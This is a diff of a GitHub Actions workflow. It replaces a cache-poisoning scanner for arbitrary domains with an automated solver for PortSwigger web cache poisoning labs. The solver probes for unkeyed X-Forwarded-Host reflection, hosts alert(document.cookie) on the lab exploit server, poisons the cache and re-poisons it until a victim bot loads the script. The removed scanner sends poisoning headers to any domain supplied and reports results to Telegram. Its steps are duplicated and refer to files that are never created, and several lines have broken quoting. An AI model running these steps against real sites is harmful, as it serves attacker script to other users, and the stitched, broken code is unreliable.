@@ -1,244 +1,146 @@
-name: True Cache Poisoning Validator
+name: Auto-Solve PS Cache Poisoning
 
 on:
   workflow_dispatch:
     inputs:
-      direct_url:
-        description: 'Paste direct URL (e.g., https://0ac4...web-security-academy.net/)'
-        required: false
-        type: string
-      domains:
-        description: 'Domains separated by / (Leave blank if using Direct URL)'
-        required: false
+      lab_url:
+        description: 'Paste FULL Lab URL (e.g., https://0ac4...web-security-academy.net/)'
+        required: true
         type: string
 
 jobs:
-  cache-poison:
+  auto-solver:
     runs-on: ubuntu-latest
     env:
       TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
       TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
     
     steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-
-      - name: Install Tools
+      - name: Install Dependencies
         run: |
-          sudo apt-get update > /dev/null 2>&1 && sudo apt-get install -y jq > /dev/null 2>&1
-          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest > /dev/null 2>&1
-          go install github.com/projectdiscovery/httpx/cmd/httpx@latest > /dev/null 2>&1
-          go install github.com/projectdiscovery/katana/cmd/katana@latest > /dev/null 2>&1
-          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest > /dev/null 2>&1
-          echo "$HOME/go/bin" >> $GITHUB_PATH
+          sudo apt-get update > /dev/null 2>&1 && sudo apt-get install -y jq curl > /dev/null 2>&1
 
-      - name: Update Nuclei Templates
-        run: nuclei -ut > /dev/null 2>&1
-
-      - name: Step 1 - Get Base URLs
+      - name: Execute Full Attack Chain
+        env:
+          LAB_URL: ${{ github.event.inputs.lab_url }}
         run: |
-          touch base_urls.txt
-          if [ -n "${{ github.event.inputs.direct_url }}" ]; then
-            echo "${{ github.event.inputs.direct_url }}" >> base_urls.txt
-          fi
-          if [ -n "${{ github.event.inputs.domains }}" ]; then
-            echo "${{ github.event.inputs.domains }}" | tr '/' '\n' | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | grep -v '^$' >> base_urls.txt
-          fi
-          sort -u base_urls.txt -o base_urls.txt
-
-      - name: Step 2 - Katana Deep Crawl (Find .js, .css, etc)
-        run: |
-          if [ ! -s "base_urls.txt" ]; then exit 0; fi
-          # Crawl aggressively to find ALL underlying files
-          cat base_urls.txt | katana -d 3 -jc -aff -silent -o all_katana_out.txt || true
-          touch all_katana_out.txt
+          # Ensure URL ends with /
+          LAB_URL="${LAB_URL%/}/"
           
-          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
-            -F chat_id="${TELEGRAM_CHAT_ID}" \
-            -F document="@all_katana_out.txt" \
-            -F caption="🕷️ Katana found these paths. Now isolating static files to test..." || true
-
-      - name: Step 3 - Isolate Static Extensions (.js, .css, .png)
-        run: |
-          if [ ! -s "all_katana_out.txt" ]; then exit 0; fi
-          
-          # CDNs ONLY cache static files. Filter them out.
-          grep -iE '\.(js|css|png|jpg|jpeg|gif|svg|woff|woff2|ttf|ico)(\?|$)' all_katana_out.txt > static_assets.txt || true
-          # Also keep the base URLs just in case
-          cat base_urls.txt >> static_assets.txt
-          sort -u static_assets.txt -o static_assets.txt
-          touch static_assets.txt
-          
-          ASSET_COUNT=$(wc -l < static_assets.txt | xargs)
           curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
             -d chat_id="${TELEGRAM_CHAT_ID}" \
-            --data-urlencode "text=🧪 Isolated ${ASSET_COUNT} static assets (.js/.css). Starting Double-Request Header Fuzzing..." || true
+            --data-urlencode "text=🚀 Auto-Solver Starting for: ${LAB_URL}" || true
 
-      - name: Step 4 - THE DOUBLE-REQUEST FUZZER (The Real Test)
-        run: |
-          if [ ! -s "static_assets.txt" ]; then exit 0; fi
-          
-          # Create a bash script that performs the EXACT PortSwigger methodology
-          cat << 'EOF' > double_request.sh
-          #!/bin/bash
-          URL="$1"
-          CANARY="evil-cacher-poison.com"
-          
-          # 1. Send the malicious header to poison the cache
-          curl -s -o /dev/null --max-time 5 "$URL" \
-            -H "X-Forwarded-Host: $CANARY" \
-            -H "X-Host: $CANARY" > /dev/null 2>&1
-          
-          # 2. Wait 1 second for the cache to save the response
-          sleep 1
-          
-          # 3. Send a COMPLETELY CLEAN REQUEST (No malicious headers)
-          # If the cache is poisoned, this clean request will return the malicious payload
-          CLEAN_RESPONSE=$(curl -s --max-time 5 "$URL")
-          
-          # 4. Check if the clean response contains our poisoned canary
-          if echo "$CLEAN_RESPONSE" | grep -qi "$CANARY"; then
-            echo "[CONFIRMED POISONED] $URL (Via X-Forwarded-Host)" >> confirmed_poisoned.txt
-          fi
-          EOF
-          
-          chmod +x double_request.sh
-          touch confirmed_poisoned.txt
-          
-          # Run the script on every static asset found by Katana
-          # Using xargs -P 5 so we don't overwhelm the lab cache, but it's still fast
-          cat static_assets.txt | xargs -P 5 -I {} ./double_request.sh "{}"
-          
-          if [ -s "confirmed_poisoned.txt" ]; then
-            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
-              -F chat_id="${TELEGRAM_CHAT_ID}" \
-              -F document="@confirmed_poisoned.txt" \
-              -F caption="🔥🔥🔥 CONFIRMED CACHE POISONING VIA DOUBLE-REQUEST! 🔥🔥🔥" || true
-          else
-            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
-              -d chat_id="${TELEGRAM_CHAT_ID}" \
-              --data-urlencode "text=❌ Double-Request Fuzzer: Cache did NOT save the poisoned payload on static files." || true
-          fi
-
-      - name: Step 5 - Nuclei Fallback (Tests non-static paths/APIs)
-        run: |
-          if [ ! -s "all_katana_out.txt" ]; then exit 0; fi
-          
-          # Nuclei tests things like URL parameter poisoning (?lang=) which the bash script doesn't cover
-          nuclei -l all_katana_out.txt -tags cache-poison,cache-deception -silent -o nuclei_results.txt || true
-          touch nuclei_results.txt
-          
-          if [ -s "nuclei_results.txt" ]; then
-            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
-              -F chat_id="${TELEGRAM_CHAT_ID}" \
-              -F document="@nuclei_results.txt" \
-              -F caption="🚨 Nuclei found parameter-based Cache Poisoning!" || true
-          else
-            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
-              -d chat_id="${TELEGRAM_CHAT_ID}" \
-              --data-urlencode "text="✅ Nuclei: No parameter poisoning found." || true
-          fi
-
-      - name: Upload All Artifacts
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: cache-results-run-${{ github.run_id }}
-          path: |
-            *.txt
-            *.sh
-          retention-days: 3
-      - name: Step 3 - Isolate Cached Infrastructure
-        run: |
-          if [ ! -s "all_httpx.json" ] && [ ! -s "direct_url_targets.txt" ]; then exit 0; fi
-          
-          > cached_endpoints.txt
-          
-          # If we used the direct URL feature, assume it might be cached and add all its paths
-          if [ -s "direct_url_targets.txt" ]; then
-            cat all_endpoints.txt >> cached_endpoints.txt
-          fi
-          
-          # If we used the domain feature, filter by CDN tech
-          if [ -s "all_httpx.json" ]; then
-            > cached_targets.txt
-            jq -r 'select(.tech | join(" ") | test("cloudflare|fastly|varnish|akamai|nginx|squid|cdn"; "i")) | .url' all_httpx.json >> cached_targets.txt 2>/dev/null || true
+          # ---------------------------------------------------------
+          # STEP 1: Extract Exploit Server URL from Lab Page
+          # ---------------------------------------------------------
+          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+            -d chat_id="${TELEGRAM_CHAT_ID}" \
+            --data-urlencode "text=[1/5] Extracting Exploit Server URL..." || true
             
-            for url in $(cat cached_targets.txt); do
-              domain=$(echo "$url" | awk -F/ '{print $3}')
-              grep "$domain" all_endpoints.txt >> cached_endpoints.txt 2>/dev/null || true
-            done
-          fi
+          LAB_HTML=$(curl -s "$LAB_URL")
+          EXPLOIT_SERVER=$(echo "$LAB_HTML" | grep -oE 'https://exploit-[a-f0-9]+\.exploit-server\.net' | head -n 1)
           
-          # Fallback: If no caching tech was detected, test everything anyway
-          if [ ! -s "cached_endpoints.txt" ]; then
-            cp all_endpoints.txt cached_endpoints.txt
-          fi
-          sort -u cached_endpoints.txt -o cached_endpoints.txt
-          touch cached_endpoints.txt
-          
-          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
-            -F chat_id="${TELEGRAM_CHAT_ID}" \
-            -F document="@cached_endpoints.txt" \
-            -F caption="☁️ Targets Prepared for Cache Poison Fuzzing" || true
-
-      - name: Step 4 - Pro Header Reflection Fuzzing
-        run: |
-          if [ ! -s "cached_endpoints.txt" ]; then exit 0; fi
-          
-          > reflection_hits.txt
-          head -n 50 cached_endpoints.txt > fuzz_sample.txt
-          
-          # Fire requests with poisoned headers to see if the backend reflects them blindly
-          cat fuzz_sample.txt | xargs -P 10 -I {} curl -s --max-time 5 "{}" \
-            -H "X-Forwarded-Host: evil-cacher-poison.com" \
-            -H "X-Host: evil-cacher-poison.com" \
-            -H "X-Forwarded-Scheme: https" \
-            -H "X-Cache-Key: evil-cacher-poison.com" 2>/dev/null | grep -i "evil-cacher-poison.com" >> reflection_hits.txt || true
-          
-          if [ -s "reflection_hits.txt" ]; then
-            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
-              -F chat_id="${TELEGRAM_CHAT_ID}" \
-              -F document="@reflection_hits.txt" \
-              -F caption="🚨 CRITICAL: Unkeyed Header Reflection Detected in HTML!" || true
-          else
+          if [ -z "$EXPLOIT_SERVER" ]; then
             curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
               -d chat_id="${TELEGRAM_CHAT_ID}" \
-              --data-urlencode "text=✅ No immediate unkeyed header reflection found." || true
+              --data-urlencode "text=❌ ERROR: Could not find exploit server. Is the lab URL correct?" || true
+            exit 1
           fi
-
-      - name: Step 5 - Nuclei Cache Poison Verification (The Double-Request)
-        run: |
-          if [ ! -s "cached_endpoints.txt" ]; then exit 0; fi
           
-          # Nuclei sends the payload once, then sends a clean request to see if the cache saved the malicious response
-          nuclei -l cached_endpoints.txt -tags cache-poison,cache-deception -silent -o nuclei_cache_results.txt || true
-          touch nuclei_cache_results.txt
-          
-          if [ -s "nuclei_cache_results.txt" ]; then
-            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
-              -F chat_id="${TELEGRAM_CHAT_ID}" \
-              -F document="@nuclei_cache_results.txt" \
-              -F caption="🔥 CONFIRMED: Cache Poisoning Successful (Double-Request Verified)!" || true
-          else
-            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
-              -d chat_id="${TELEGRAM_CHAT_ID}" \
-              --data-urlencode "text=✅ Nuclei: Cache did not save the poisoned payload." || true
-          fi
-
-      - name: Upload All Artifacts
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: cache-poisoning-run-${{ github.run_id }}
-          path: |
-            *.txt
-            *.json
-          retention-days: 7
-
-      - name: Pipeline Finished
-        if: always()
-        run: |
           curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
             -d chat_id="${TELEGRAM_CHAT_ID}" \
-            --data-urlencode "text=🛑 Web Cache Poisoning Pipeline Completely Finished." || true
+            --data-urlencode "text=✅ Found Exploit Server: ${EXPLOIT_SERVER}" || true
+
+          # ---------------------------------------------------------
+          # STEP 2: Detect Unkeyed Header & Reflected Path
+          # ---------------------------------------------------------
+          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+            -d chat_id="${TELEGRAM_CHAT_ID}" \
+            --data-urlencode "text="[2/5] Probing for X-Forwarded-Host reflection..." || true
+            
+          CANARY="canary-test.com"
+          # Bypass cache to hit backend
+          PROBE_RESPONSE=$(curl -s "${LAB_URL}?cb=$(date +%s)" -H "X-Forwarded-Host: ${CANARY}")
+          
+          # Extract the path that was reflected (e.g., /resources/js/tracking.js)
+          REFLECTED_PATH=$(echo "$PROBE_RESPONSE" | grep -oE "https://${CANARY}[^\s'\"<>]+" | sed "s|https://${CANARY}||" | head -n 1)
+          
+          if [ -z "$REFLECTED_PATH" ]; then
+            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+              -d chat_id="${TELEGRAM_CHAT_ID}" \
+              --data-urlencode "text=❌ ERROR: X-Forwarded-Host is not reflected." || true
+            exit 1
+          fi
+          
+          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+            -d chat_id="${TELEGRAM_CHAT_ID}" \
+            --data-urlencode "text="✅ Reflected Path Found: ${REFLECTED_PATH}" || true
+
+          # ---------------------------------------------------------
+          # STEP 3: Upload Payload to Exploit Server
+          # ---------------------------------------------------------
+          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+            -d chat_id="${TELEGRAM_CHAT_ID}" \
+            --data-urlencode "text="[3/5] Uploading alert(document.cookie) to Exploit Server..." || true
+            
+          PAYLOAD="alert(document.cookie)"
+          
+          # Interact with PortSwigger Exploit Server API to host the file
+          curl -s -X POST "$EXPLOIT_SERVER/" \
+            -d "url=${REFLECTED_PATH}" \
+            -d "responseBody=${PAYLOAD}" \
+            -d "responseHeaders=Content-Type: text/javascript" \
+            -d "responseType=200" > /dev/null
+          
+          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+            -d chat_id="${TELEGRAM_CHAT_ID}" \
+            --data-urlencode "text="✅ Exploit Server configured." || true
+
+          # ---------------------------------------------------------
+          # STEP 4: Poison the Cache
+          # ---------------------------------------------------------
+          # Extract just the hostname (e.g., exploit-xxx.exploit-server.net)
+          EXPLOIT_HOST=$(echo "$EXPLOIT_SERVER" | awk -F/ '{print $3}')
+          
+          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+            -d chat_id="${TELEGRAM_CHAT_ID}" \
+            --data-urlencode "text="[4/5] Poisoning the cache with ${EXPLOIT_HOST}..." || true
+            
+          # Send the actual poisoning request
+          curl -s -o /dev/null "$LAB_URL" -H "X-Forwarded-Host: ${EXPLOIT_HOST}"
+
+          # ---------------------------------------------------------
+          # STEP 5: Monitor Victim & Verify
+          # ---------------------------------------------------------
+          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+            -d chat_id="${TELEGRAM_CHAT_ID}" \
+            --data-urlencode "text="[5/5] Waiting for victim bot to execute payload... (Cache expires every 30s, re-poisoning automatically)" || true
+            
+          SOLVED=0
+          for i in {1..40}; do
+            sleep 2
+            
+            # Check exploit server logs to see if the victim fetched the JS file
+            LOGS=$(curl -s "$EXPLOIT_SERVER/log")
+            
+            if echo "$LOGS" | grep -q "${REFLECTED_PATH}"; then
+              SOLVED=1
+              break
+            fi
+            
+            # Re-poison every 10 seconds to ensure cache stays poisoned until victim visits
+            if (( i % 5 == 0 )); then
+              curl -s -o /dev/null "$LAB_URL" -H "X-Forwarded-Host: ${EXPLOIT_HOST}"
+            fi
+          done
+          
+          if [ "$SOLVED" -eq 1 ]; then
+            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+              -d chat_id="${TELEGRAM_CHAT_ID}" \
+              --data-urlencode "text="🎉🎉🎉 LAB SOLVED! 🎉🎉🎉\n\nThe victim bot fetched the poisoned JS file and executed alert(document.cookie)." || true
+          else
+            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+              -d chat_id="${TELEGRAM_CHAT_ID}" \
+              --data-urlencode "text="⏱️ Timed out waiting for victim. The cache might have been poisoned, but the bot didn't visit within the time limit." || true
+          fi
